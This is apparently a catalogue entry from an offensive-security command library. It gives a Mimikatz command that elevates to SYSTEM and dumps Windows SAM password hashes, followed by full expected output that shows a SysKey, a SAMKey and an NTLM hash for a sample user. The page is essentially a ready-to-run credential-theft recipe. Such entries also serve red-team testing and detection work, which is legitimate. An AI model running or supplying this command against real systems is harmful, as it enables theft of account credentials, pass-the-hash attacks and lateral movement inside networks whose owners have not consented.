---
id: 4425f6bb-aa8f-4a1c-8feb-06e6abb54073
name: Mimikatz Extract Windows LM/NTLM Hashes From SAM
type: command
executor: ''
data: mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
output: "C:\\Users\\BOB\\Desktop>mimikatz.exe \"privilege::debug\" \"token::elevate\"\
  \ \"lsadump::sam\" \"exit\"\n\n  .#####.   mimikatz 2.2.0 (x86) #18362 Aug 14 2019\
  \ 01:31:19\n .## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n ## / \\ ##  /*** Benjamin\
  \ DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n\
  \ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'\
  \        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(commandline)\
  \ # privilege::debug\nPrivilege '20' OK\n\nmimikatz(commandline) # token::elevate\n\
  Token Id  : 0\nUser name :\nSID name  : NT AUTHORITY\\SYSTEM\n\n604     {0;000003e7}\
  \ 1 D 48132          NT AUTHORITY\\SYSTEM     S-1-5-18        (04g,21p)       Primary\n\
  \ -> Impersonated !\n * Process Token : {0;000f49bf} 1 F 9392857     BOB-PC\\BOB\
  \  S-1-5-21-3521375537-2753578558-3836635798-1001  (14g,24p)       Primary\n * Thread\
  \ Token  : {0;000003e7} 1 D 9444810     NT AUTHORITY\\SYSTEM     S-1-5-18      \
  \  (04g,21p)       Impersonation (Delegation)\n\nmimikatz(commandline) # lsadump::sam\n\
  Domain : BOB-PC\nSysKey : 60d2304afae5b26642a5c89236337270\nLocal SID : S-1-5-21-3521375537-2753578558-3836635798\n\
  \nSAMKey : 2f88d60b651b355ecb30d47407accc2d\n\n...\n...\n\nRID  : 000003e9 (1001)\n\
  User : BOB\n  Hash NTLM: 0ef43e29b16be7f1556b934ef841a2ef \n\nmimikatz(commandline)\
  \ # exit\nBye!"
created_at: '2019-09-27T21:15:40.391096+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Mimikatz Extract Windows LM/NTLM Hashes From SAM

```bash
mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
```

## Expected Output

```
C:\Users\BOB\Desktop>mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"

  .#####.   mimikatz 2.2.0 (x86) #18362 Aug 14 2019 01:31:19
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

604     {0;000003e7} 1 D 48132          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000f49bf} 1 F 9392857     BOB-PC\BOB  S-1-5-21-3521375537-2753578558-3836635798-1001  (14g,24p)       Primary
 * Thread Token  : {0;000003e7} 1 D 9444810     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : BOB-PC
SysKey : 60d2304afae5b26642a5c89236337270
Local SID : S-1-5-21-3521375537-2753578558-3836635798

SAMKey : 2f88d60b651b355ecb30d47407accc2d

...
...

RID  : 000003e9 (1001)
User : BOB
  Hash NTLM: 0ef43e29b16be7f1556b934ef841a2ef 

mimikatz(commandline) # exit
Bye!
```
